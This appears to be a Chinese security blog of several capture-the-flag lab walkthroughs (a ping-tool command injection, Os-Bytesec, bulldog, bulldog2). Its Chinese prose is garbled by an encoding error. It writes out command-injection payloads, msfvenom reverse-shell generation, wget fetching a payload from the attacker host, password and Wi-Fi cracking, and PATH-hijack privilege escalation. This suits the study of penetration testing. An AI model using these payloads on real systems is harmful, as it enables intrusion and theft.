è¿›å…¥/5ecure/è·¯å¾„ä¹‹åå‘ç°æ˜¯ä¸€ä¸ªpingå·¥å…·ï¼Œç»“åˆä¸€ä¸‹CTFçš„å†…å®¹ä¸éš¾æƒ³åˆ°è¿™ä¸ªå°±æ˜¯å‘½ä»¤æ³¨å…¥äº†ï¼Œå‘½ä»¤æ‰§è¡Œæ˜¯åœ¨out.phpä¸‹æ‰§è¡Œçš„ï¼Œè€Œä¸”pingçš„ç»“æœä¼šæœ‰å›æ˜¾ &amp; &amp;&amp; | || ; ç”¨è¿™å‡ ä¸ªç¬¦å·æŒ¨ä¸ªå°è¯•å‘½ä»¤æ³¨å…¥ å‘ç°127.0.0.1|lså¯ä»¥åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ 127.0.0.1|cat /etc/passwd ä¹Ÿèƒ½è¯»å–passwdæ–‡ä»¶ å°è¯•å†™å…¥phpinfo 127.0.0.1|echo '&lt;?php phpinfo();?&gt;' &gt; 1.php ä½†æ˜¯è®¿é—®1.phpæ—¶phpinfoæœªæ˜¾ç¤ºï¼Œå¯èƒ½å­˜åœ¨è¿‡æ»¤ 127.0.0.1|echo '&lt;?php phpinfo();?&gt;' &gt; 1.txt 1.txtä¸­æ˜¾ç¤ºçš„æ˜¯&lt;?php phpinfo;?&gt; çœ‹æ ·å­æ˜¯è¿‡æ»¤æ‰äº†å°æ‹¬å· æŸ¥çœ‹out.php 127.0.0.1|cat out.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; &#x2F;&#x2F; Get input $target &#x3D; trim($_REQUEST[ &#39;ip&#39; ]); &#x2F;&#x2F; Set blacklist $substitutions &#x3D; array( &#39;&amp;&#39; &#x3D;&gt; &#39;&#39;, &#39;;&#39; &#x3D;&gt; &#39;&#39;, &#39;| &#39; &#x3D;&gt; &#39;&#39;, &#39;-&#39; &#x3D;&gt; &#39;&#39;, &#39;$&#39; &#x3D;&gt; &#39;&#39;, &#39;(&#39; &#x3D;&gt; &#39;&#39;, &#39;)&#39; &#x3D;&gt; &#39;&#39;, &#39;&#96;&#39; &#x3D;&gt; &#39;&#39;, &#39;||&#39; &#x3D;&gt; &#39;&#39;, ); &#x2F;&#x2F; Remove any of the charactars in the array (blacklist). $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target ); &#x2F;&#x2F; Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123; &#x2F;&#x2F; Windows $cmd &#x3D; shell_exec( &#39;ping &#39; . $target ); &#125; else &#123; &#x2F;&#x2F; *nix $cmd &#x3D; shell_exec( &#39;ping -c 4 &#39; . $target ); &#125; &#x2F;&#x2F; Feedback for the end user echo &quot;&#123;$cmd&#125;&quot;;&#125;?&gt; å¯ä»¥çœ‹åˆ°è¿‡æ»¤æ‰äº†ä¸€äº›ç‰¹æ®Šç¬¦å·ï¼Œå°è¯•ä½¿ç”¨wgetå‘½ä»¤æ¥ä¸‹è½½åé—¨ ä½¿ç”¨msfvenomåˆ›å»ºåŸºäºphpçš„meterpreteråé—¨ 1msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 -f raw &gt; shell.php å»æ‰shell.phpä¸­å¼€å¤´çš„/* å¼€å¯pythonçš„httpæœåŠ¡ python -m SimpleHTTPServer 8000 åœ¨ç½‘é¡µä¸­æ‰§è¡Œwget 127.0.0.1|wget http://192.168.31.10:8000/shell.php åœ¨MSFä¸­æ¥æ”¶Meterpreter 12345use exploit&#x2F;multi&#x2F;handlerset payload php&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 2020run å†è®¿é—®shell.phpå³å¯ æƒé™æå‡ åœ¨Meterpreterçš„shellä¸­è·å–TTY 12shellpython -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; åœ¨passwdæ–‡ä»¶ä¸­å‘ç°å¯ç”¨è´¦æˆ·recon ä¸€ç•ªå°è¯•åå‘ç°è´¦æˆ·å¯†ç åŒBasicè®¤è¯çš„å¯†ç  123456su reconSecurity@hackNossudo suSecurity@hackNosid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) å¦‚ä½•æ‰¾åˆ°é¶æœºçš„IP? è¿™ä¸ªé—®é¢˜æ›¾ç»è®©æˆ‘å¤´ç–¼è¿‡ä¸€é˜µå­ çœ‹ç€ç½‘ä¸Šçš„WPï¼Œæœ‰äº›æ˜¯ä½¿ç”¨netdiscoverï¼Œä½†æ˜¯ä¸ªäººå€¾å‘äºå°†é¶æœºä¸Kaliçš„ç½‘ç»œé…ç½®æˆæ¡¥æ¥æ¨¡å¼ï¼Œå³ä½¿netdiscoverå‘ç°äº†é¶æœºï¼Œä¹Ÿæ²¡æœ‰ä¸€ä¸ªæ˜æ˜¾åœ°ç‰¹å¾å¯ä»¥åœ¨å½“å‰ç½‘æ®µçš„ä¼—å¤šæœºå™¨ä¸­å»åŒºåˆ† ä¸ªäººçš„è¯å€’æ˜¯ä¼šå»çœ‹è·¯ç”±å™¨çš„åå°ï¼Œç„¶åçœ‹çœ‹æœ¬æœºä¸Šçš„å¤šä¸ªIP è€ŒNmapåœ¨æ‰«æé¶æœºæ—¶ï¼Œå¯ä»¥æŠ¥å‘Šå…¶MACåœ°å€ä¸ç›¸å…³å‚å•†ï¼Œè€Œä¸€èˆ¬çš„é¶æœºéƒ½ä¼šåœ¨80ç«¯å£å¼€æ”¾WEBæœåŠ¡ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰«æ80ç«¯å£ï¼Œå†é…åˆä¸Šgrepæ¥èŠ‚é€‰å‡ºé¶æœº nmap -p 80 -Pn -v -T5 192.168.31.0/24 | grep -B 6 virtual Web log åœ¨å°è¯•å‘½ä»¤æ‰§è¡Œçš„æ—¶å€™æˆ‘ä¹Ÿå°è¯•äº†ä½¿ç”¨curlå‘½ä»¤æ¥è¿›è¡Œæ•°æ®å¤–ä¼ ï¼Œä½†æ˜¯å‘ç°è‡ªå·±æ‰¾ä¸åˆ°WebæœåŠ¡çš„logæ–‡ä»¶ï¼Œåªå¥½ç”¨findå‘½ä»¤é…åˆgrepæ‰¾ï¼Œä¸­é—´ä¹Ÿç¨å¾®å­¦ä¹ äº†ä¸€ä¸‹grepçš„æ­£åˆ™ç”¨æ³• find /* -iname &quot;*.log&quot; | grep -E &quot;(apache|nginx)&quot; å¤§æ¦‚æ˜¯è¿™ä¸ªæ ·å­ å‚è€ƒèµ„æ–™ FTP WP grep&amp;RE Os-Bytesec 2020/02/15 16:50:01 ç«¯å£æ‰«æ nmap -p- -Pn -sV -n -T5 -v -A 192.168.31.185 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657Nmap scan report for 192.168.31.185Host is up (0.0012s latency).Not shown: 65531 closed portsPORT STATE SERVICE VERSION80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8| http-methods: |_ Supported Methods: OPTIONS GET HEAD POST|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)|_http-title: Hacker_James139&#x2F;tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445&#x2F;tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)2525&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 12:55:4f:1e:e9:7e:ea:87:69:90:1c:1f:b0:63:3f:f3 (RSA)| 256 a6:70:f1:0e:df:4e:73:7d:71:42:d6:44:f1:2f:24:d2 (ECDSA)|_ 256 f0:f8:fd:24:65:07:34:c2:d4:9a:1f:c0:b8:2e:d8:3a (ED25519)MAC Address: 08:00:27:55:0A:C2 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 0.281 days (since Fri Feb 14 21:05:09 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;264 (Good luck!)IP ID Sequence Generation: All zerosService Info: Host: NITIN; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelHost script results:|_clock-skew: mean: -18h25m11s, deviation: 3h10m31s, median: -16h35m11s| nbstat: NetBIOS name: NITIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| Names:| NITIN&lt;00&gt; Flags: &lt;unique&gt;&lt;active&gt;| NITIN&lt;03&gt; Flags: &lt;unique&gt;&lt;active&gt;| NITIN&lt;20&gt; Flags: &lt;unique&gt;&lt;active&gt;| \\x01\\x02__MSBROWSE__\\x02&lt;01&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;00&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;1d&gt; Flags: &lt;unique&gt;&lt;active&gt;|_ WORKGROUP&lt;1e&gt; Flags: &lt;group&gt;&lt;active&gt;| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: nitin| NetBIOS computer name: NITIN\\x00| Domain name: 168.1.7| FQDN: nitin.168.1.7|_ System time: 2020-02-14T21:43:57+05:30| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2020-02-14 11:13:57|_ start_date: N&#x2F;A Webè·¯å¾„æšä¸¾ dirb http://192.168.31.185/ -w 123456789---- Scanning URL: http:&#x2F;&#x2F;192.168.31.185&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;css&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;gallery&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;html&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;img&#x2F; + http:&#x2F;&#x2F;192.168.31.185&#x2F;index.html (CODE:200|SIZE:3086) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;js&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;news&#x2F; + http:&#x2F;&#x2F;192.168.31.185&#x2F;server-status (CODE:403|SIZE:279) åœ¨index.htmlé¡µé¢çš„åº•ç«¯è·å–ä¸€æ®µå­—ç¬¦ä¸² ####################GET#####smb##############free åœ¨å›¾ç‰‡/img/news.pngä¸­è·å–ä¿¡æ¯BlueKeep Attacks BlueKeepæ˜¯Windowsä¸ŠRDPæœåŠ¡ä¸Šçš„æ¼æ´(CVE-2019-0708)ï¼Œç›®æµ‹ä¸æœ¬é¶æœºå…³è”å¹¶ä¸å¤§ã€‚ æ¼æ´åˆ©ç”¨ enum4linux 192.168.31.185 123S-1-22-1-1000 Unix User\\sagar (Local User)S-1-22-1-1001 Unix User\\blackjax (Local User)S-1-22-1-1002 Unix User\\smb (Local User) è·å¾—ä¸‰ä¸ªè´¦æˆ·å ä½¿ç”¨smbmapè¿›è¡Œæµ‹è¯• 12345678smbmap -H 192.168.31.185[+] Finding open SMB ports....[+] Guest SMB session established on 192.168.31.185...[+] IP: 192.168.31.185:445 Name: 192.168.31.185 Disk Permissions ---- ----------- print$ NO ACCESS IPC$ NO ACCESS 12345678smbmap -H 192.168.31.185 -u smb[+] Finding open SMB ports....[+] User SMB session establishd on 192.168.31.185...[+] IP: 192.168.31.185:445 Name: 192.168.31.185 Disk Permissions ---- ----------- print$ READ ONLY IPC$ NO ACCESS è´¦æˆ·smbå¯ä»¥ç™»å…¥SMBæœåŠ¡ ä½¿ç”¨hydraçˆ†ç ´SMBæœåŠ¡ä¸­SMBè´¦æˆ·çš„å¯†ç  12345hydra -I -l smb -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -e n smb:&#x2F;&#x2F;192.168.31.185[DATA] attacking smb:&#x2F;&#x2F;192.168.31.185:445&#x2F;[445][smb] host: 192.168.31.185 login: smb1 of 1 target successfully completed, 1 valid password found å¯†ç ä¸ºç©º ç™»å…¥SMBæœåŠ¡ 123456789smbclient &#x2F;&#x2F;192.168.31.185&#x2F;smb -U smbls . D 0 Mon Nov 4 06:50:37 2019 .. D 0 Mon Nov 4 06:37:28 2019 main.txt N 10 Mon Nov 4 06:45:38 2019 safe.zip N 3424907 Mon Nov 4 06:50:37 2019 9204224 blocks of size 1024. 6824568 blocks available ä¸‹è½½æ–‡ä»¶ 12get main.txtget safe.zip main.txtä¸­æ²¡æœ‰æœ‰æ•ˆä¿¡æ¯ safe.zipè¢«åŠ å¯† ä½¿ç”¨fcrackzipè¿›è¡Œçˆ†ç ´ 123fcrackzip -u -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt safe.zip PASSWORD FOUND!!!!: pw &#x3D;&#x3D; hacker1 è§£å‹å‹ç¼©åŒ… 12unzip safe.ziphacker1 å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶ secret.jpg æœ‰æ–‡å­—â€“â€œAFTER THE WALKOUTâ€ï¼Œæš‚æ—¶ä¸è€ƒè™‘å›¾ç‰‡éšå†™ç­‰å…¶ä»–å› ç´  user.cap WireShareæ‰“å¼€ä¹‹åæ˜¯IEEE 802.11åè®®(WIFI)çš„æµé‡åŒ…ï¼Œå¯èƒ½å­˜åœ¨æ¡æ‰‹åŒ… 1234567891011121314151617181920212223242526272829303132333435aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt user.capOpening user.cap please wait...Read 49683 packets. # BSSID ESSID Encryption 1 56:DC:1D:19:52:BC blackjax WPA (1 handshake)Choosing first network as target.Opening user.cap please wait...Read 49683 packets.1 potential targets Aircrack-ng 1.5.2 [00:00:07] 21280&#x2F;7120712 keys tested (2885.36 k&#x2F;s) Time left: 41 minutes, 0 seconds 0.30% KEY FOUND! [ snowflake ] Master Key : 80 0A BE 28 5A 50 78 10 7E E2 85 A8 E8 D0 41 3C 5E CB 18 C2 40 05 D7 7F E1 12 E6 B4 C6 D8 F4 E5 Transient Key : C8 9D B1 E2 76 82 F3 90 AC 53 CB 02 8F D0 73 FB 47 92 63 63 56 97 1C 19 36 BD FD B4 D5 6D 65 35 48 1B D3 06 57 40 4D 77 9D BD 26 30 1B B3 06 AF 1B FA 37 7E E8 9C 17 07 BE 63 DD C0 11 D4 88 21 EAPOL HMAC : 68 98 0E 18 F9 DA 55 3B 4B BC EA 35 37 CC 25 2F SSIDä¸ºblackjaxï¼Œå¯†ç ä¸ºsnowflake åœ¨WireSharkä¸­è°ƒè¯• Preference -&gt; Protocols -&gt; IEEE 802.11-&gt; Decryption keys -&gt; Edit æ·»åŠ Keyè®°å½• wpa-pwd|snowflake:blackjax æµé‡åŒ…ä¸­æœªæ‰¾åˆ°å…¶ä»–æœ‰æ•ˆä¿¡æ¯ å°è¯•æšä¸¾SSHè´¦æˆ· 123echo -e &quot;smb\\nblackjax\\nsagar\\nroot\\nadmin\\nhelo\\nsnowflake&quot; &gt; testhydra -I -L test -P test -e ns -u ssh:&#x2F;&#x2F;192.168.31.185 -s 2525 [2525][ssh] host: 192.168.31.185 login: blackjax password: snowflake è·å–è´¦æˆ·blackjax æƒé™æå‡ ç™»å…¥SSHæœåŠ¡ 123ssh blackjax@192.168.31.185 -p 2525snowflake&#x2F;bin&#x2F;bash å°è¯•SUIDææƒ 12345678910111213141516171819202122232425find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device&#x2F;usr&#x2F;bin&#x2F;newgidmap&#x2F;usr&#x2F;bin&#x2F;gpasswd&#x2F;usr&#x2F;bin&#x2F;newuidmap&#x2F;usr&#x2F;bin&#x2F;chfn&#x2F;usr&#x2F;bin&#x2F;passwd&#x2F;usr&#x2F;bin&#x2F;chsh&#x2F;usr&#x2F;bin&#x2F;pkexec&#x2F;usr&#x2F;bin&#x2F;newgrp&#x2F;usr&#x2F;bin&#x2F;netscan&#x2F;usr&#x2F;bin&#x2F;sudo&#x2F;bin&#x2F;ping6&#x2F;bin&#x2F;fusermount&#x2F;bin&#x2F;mount&#x2F;bin&#x2F;su&#x2F;bin&#x2F;ping&#x2F;bin&#x2F;umount&#x2F;bin&#x2F;ntfs-3g /usr/bin/netscanæœ‰äº›å¼‚å¸¸ ä½¿ç”¨stringså‘½ä»¤åˆ†æ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182strings &#x2F;usr&#x2F;bin&#x2F;netscan &#x2F;lib&#x2F;ld-linux.so.2libc.so.6_IO_stdin_usedsetuidsystemsetgid__libc_start_main__gmon_start__GLIBC_2.0PTRhQVhkUWVSt$,U[^_]netstat -antp;*2$&quot;(GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.7209__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrypingshell.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable__x86.get_pc_thunk.bx_edata__data_startsetgid@@GLIBC_2.0system@@GLIBC_2.0__gmon_start____dso_handle_IO_stdin_used__libc_start_main@@GLIBC_2.0__libc_csu_init_fp_hw__bss_startmainsetuid@@GLIBC_2.0_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTable.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment å¯ä»¥çœ‹åˆ°netstat -antp çŒœæƒ³è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯åœ¨æ‰§è¡Œnetstatå‘½ä»¤ åˆ™å¯ä»¥è¿›è¡ŒPATHææƒ 123456789cd &#x2F;tmpecho &quot;&#x2F;bin&#x2F;bash&quot; &gt;netstatchmod 777 netstatecho $PATHexport PATH&#x3D;&#x2F;tmp:$PATHcd &#x2F;usr&#x2F;bin.&#x2F;netscanid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),1001(blackjax) PATHææƒ ç›®æ ‡æ–‡ä»¶ä¸ºäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ éœ€è¦çŸ¥é“ç›®æ ‡æ–‡ä»¶æ‰€æ‰§è¡Œçš„å‘½ä»¤ stringsæŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶å†…å®¹ å‚è€ƒèµ„æ–™ WP WP SMB PATHææƒ bulldog 2020/02/17 19:06:44 ç«¯å£æ‰«æ nmap -p 1-65535 -sV -T5 -n -v -A 192.168.31.121 1234567891011121314151617181920212223242526272829Nmap scan report for 192.168.31.121Host is up (0.0011s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION23&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)| 256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)|_ 256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)80&#x2F;tcp open http WSGIServer 0.1 (Python 2.7.12)| http-methods: |_ Supported Methods: GET HEAD OPTIONS|_http-server-header: WSGIServer&#x2F;0.1 Python&#x2F;2.7.12|_http-title: Bulldog Industries8080&#x2F;tcp open http WSGIServer 0.1 (Python 2.7.12)| http-methods: |_ Supported Methods: GET HEAD OPTIONS|_http-server-header: WSGIServer&#x2F;0.1 Python&#x2F;2.7.12|_http-title: Bulldog IndustriesMAC Address: 08:00:27:33:65:D8 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 0.003 days (since Sun Feb 16 21:45:10 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;257 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Webè·¯å¾„æšä¸¾ å°è¯•çˆ†ç ´80ç«¯å£ä¸‹çš„Webè·¯å¾„ dirb http://192.168.31.121/ 123456---- Scanning URL: http:&#x2F;&#x2F;192.168.31.121&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121&#x2F;admin&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121&#x2F;dev&#x2F; + http:&#x2F;&#x2F;192.168.31.121&#x2F;robots.txt (CODE:200|SIZE:1071)---- Entering directory: http:&#x2F;&#x2F;192.168.31.121&#x2F;dev&#x2F;shell&#x2F; ---- å°è¯•çˆ†ç ´8080ç«¯å£ä¸‹çš„Webè·¯å¾„ 12345678dirb http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;---- Scanning URL: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;admin&#x2F;&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;dev&#x2F;+ http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;robots.txt (CODE:200|SIZE:1071) ---- Entering directory: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;dev&#x2F;shell&#x2F; ---- 80ç«¯å£ä¸8080ç«¯å£ä¸Šçš„WEBæœåŠ¡çš„è·¯å¾„å‡ ä¹ä¸€æ ·ï¼Œæå¯èƒ½æ˜¯åŒä¸€ä¸ªç«™ç‚¹ã€‚ è®¿é—®ä¸¤ä¸ªWEBæœåŠ¡ä¹‹åå‘ç°å¹¶æ— å·®åˆ«ï¼Œå…ˆå¯¹80ç«¯å£è¿›è¡Œæ¸—é€ã€‚ æ¼æ´åˆ©ç”¨ è®¿é—®è·¯å¾„/admin/è·³è½¬è‡³ç™»å½•ç•Œé¢ ç®€å•å°è¯•å¼±å£ä»¤åæ— æ•ˆ è®¿é—®è·¯å¾„/dev/shell/æ—¶æç¤º &quot;Please authenticate with the server to use Web-Shell&quot; çŒœæµ‹éœ€è¦åœ¨ä¹‹å‰çš„ç™»å½•ç•Œé¢ä¸­ç™»å…¥åæ‰èƒ½è®¿é—® è®¿é—®è·¯å¾„/dev/ä¸/æ—¶å‘ç°ä¸€äº›äººå åˆ¶ä½œç®€æ˜“å­—å…¸ 123456789101112131415161718192021222324252627282930313233343536373839cat dicWinston ChurchyBulldog IndustriesAlan Brookealan@bulldogindustries.comwilliam@bulldogindustries.commalik@bulldogindustries.comkevin@bulldogindustries.comashley@bulldogindustries.comnick@bulldogindustries.comsarah@bulldogindustries.comadmin@bulldogindustries.comadminrootSarahsarahNicknickAshleyashleyKevinkevinMalikmalikWilliamwilliamAlanalanBrookebrookeBulldogbulldogIndustriesindustriesWinstonwinstonChurchychurchy ä½¿ç”¨burpsuiteè¿›è¡Œè´¦æˆ·çˆ†ç ´ å¾—åˆ°è´¦æˆ·nick:bulldog ç™»å…¥ä¹‹åå¾—åˆ°æç¤ºYou don't have permission to edit anything. æ­¤æ—¶å†è®¿é—®/dev/shell/ WEBç«¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ -&gt; å‘½ä»¤æ³¨å…¥ ç®€å•å°è¯•ä¹‹åå‘ç°ls|cat /etc/passwdå¯ä»¥æ‰§è¡Œ ä½†æ˜¯è¿™ä¸ªWEBæ˜¯åŸºäºpythonçš„Djangoæ¶æ„ï¼Œä¸å­˜åœ¨å†™å…¥ä¸€å¥è¯æœ¨é©¬çš„æ–¹æ³•ã€‚ å¤§æ¦‚æœ‰ä¸¤ç§æ–¹æ³•ï¼š ncè¿æ¥(æ­£å‘è¿æ¥/åå¼¹Shell) wgetä¸‹è½½åé—¨ç¨‹åº ç¬¬ä¸€ç§æ–¹æ³• ç›´æ¥è¿”å›500 pass ç¬¬äºŒç§æ–¹æ³• ç”Ÿæˆåé—¨æ–‡ä»¶&amp;å¯åŠ¨HTTPæœåŠ¡ 12msfvenom -p python&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 &gt; shell.pypython -m SimpleHTTPServer 80 &amp; MSF 12345use exploit&#x2F;multi&#x2F;handlerset payload python&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 2020run å‘½ä»¤æ³¨å…¥ 12ls|wget http:&#x2F;&#x2F;192.168.31.10&#x2F;shell.pyls|python shell.py åœ¨MSFä¸­æ¥æ”¶åˆ°Shell æƒé™æå‡ è·å–tty 12shellpython -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; åœ¨è·¯å¾„/home/bulldogadmin/ä¸‹å‘ç°éšè—è·¯å¾„.hiddenadmindirectory è¿›å…¥ä¹‹åå‘ç°ä¸¤ä¸ªæ–‡ä»¶noteï¼ŒcustomPermissionApp å…ˆå°†ä¸¤ä¸ªæ–‡ä»¶å¤åˆ¶è‡³è‡ªå·±homeç›®å½•ä¸‹å¹¶æ›´æ”¹æƒé™ 12cp * &#x2F;home&#x2F;django&#x2F;chmod 700 note customPermissionApp 1234567891011cat note Nick,I&#39;m working on the backend permission stuff. Listen, it&#39;s super prototype but I think it&#39;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! It&#39;s great stuff! Once I&#39;m finished with it, a hacker wouldn&#39;t even be able to reverse it! Keep in mind that it&#39;s still a prototype right now. I am about to get it working with the Django user account. I&#39;m not sure how I&#39;ll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?Let me know what you think of it!-Ashley å¦å¤–ä¸€ä¸ªæ–‡ä»¶æ˜¯elfæ–‡ä»¶ï¼Œå¤§æ¦‚å¯¹äºææƒæœ‰å¸®åŠ© ç›´æ¥æ‰§è¡Œåˆ™æç¤ºéœ€è¦è¾“å…¥è‡ªå·±çš„å¯†ç ï¼Œå¤§æ¦‚åœ¨æ‰§è¡Œsudo su ç”¨stringså‘½ä»¤åˆ†æä¸€ä¸‹å†…å®¹ çœ‹åˆ°ä¸€ä¸²æœ‰æ„æ€çš„å­—ç¬¦ 1234SUPERultHimatePASHSWORDyouHCANTget å¯ä»¥çŒœæµ‹å¯†ç æ˜¯SUPERultHimatePASHSWORDyouHCANTget æˆ–SUPERultimatePASSWORDyouCANTget 1234sudo suSUPERultimatePASSWORDyouCANTgetid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) å‚è€ƒèµ„æ–™ Burp.Intruder bulldog2 2020/02/20 16:35:33 ç«¯å£æ‰«æ nmap -sV -p 1-65535 -T 5 -n -A -v 192.168.31.233 12345678910111213141516171819202122Nmap scan report for 192.168.31.233Host is up (0.0012s latency).Not shown: 65534 filtered portsPORT STATE SERVICE VERSION80&#x2F;tcp open http nginx 1.14.0 (Ubuntu)|_http-cors: HEAD GET POST PUT DELETE PATCH|_http-favicon: Unknown favicon MD5: B9AA7C338693424AAE99599BEC875B5F| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx&#x2F;1.14.0 (Ubuntu)|_http-title: Bulldog.socialMAC Address: 08:00:27:FE:62:D8 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9Uptime guess: 43.190 days (since Tue Jan 7 22:59:12 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;253 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Webè·¯å¾„æšä¸¾ å°è¯•çˆ†ç ´80ç«¯å£ä¸‹çš„Webè·¯å¾„ dirb http://192.168.31.233/ -w 123---- Scanning URL: http:&#x2F;&#x2F;192.168.31.233&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.233&#x2F;assets (CODE:301|SIZE:179) + http:&#x2F;&#x2F;192.168.31.233&#x2F;favicon.ico (CODE:200|SIZE:5430) 